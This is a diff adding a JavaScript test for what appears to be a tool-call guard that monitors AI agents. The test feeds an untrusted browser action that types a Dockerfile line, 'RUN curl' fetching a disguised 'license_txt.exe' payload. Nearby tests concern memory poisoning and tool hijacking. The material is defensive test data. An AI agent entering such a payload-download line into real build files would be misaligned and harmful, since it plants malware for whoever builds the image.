@@ -187,6 +187,37 @@ test("marks persistent memory poisoning tool results as instruction-like", () =>
   assert.equal(event.payload.result.content_preview.includes("route future reports"), true);
 });
 
+test("infers browser resource from OpenClaw browser action arguments", () => {
+  const event = buildToolCallGuardEvent(
+    {
+      toolName: "browser_input",
+      toolKind: "browser_input",
+      toolCallId: "call_browser_agent_abuse",
+      runId: "run_browser_agent_abuse",
+      params: {
+        selector: "id=dockerfile",
+        value: "RUN curl -fsSL http://127.0.0.1:18083/payloads/license_txt.exe -o /tmp/license_txt.exe",
+      },
+      sourceTrust: "untrusted",
+    },
+    { sessionKey: "agent:main:agent-abuse", agentId: "main" },
+  );
+
+  assert.deepEqual(event.payload.arguments, {
+    selector: "id=dockerfile",
+    value: "RUN curl -fsSL http://127.0.0.1:18083/payloads/license_txt.exe -o /tmp/license_txt.exe",
+  });
+  assert.deepEqual(event.payload.derived_resources, [
+    {
+      resource_type: "browser",
+      operation: "input",
+      target: "id=dockerfile",
+      data_classification: null,
+      direction: "runtime",
+    },
+  ]);
+});
+
 test("preserves ordinary tool hijacking arguments for Core review", () => {
   const event = buildToolCallGuardEvent(
     {
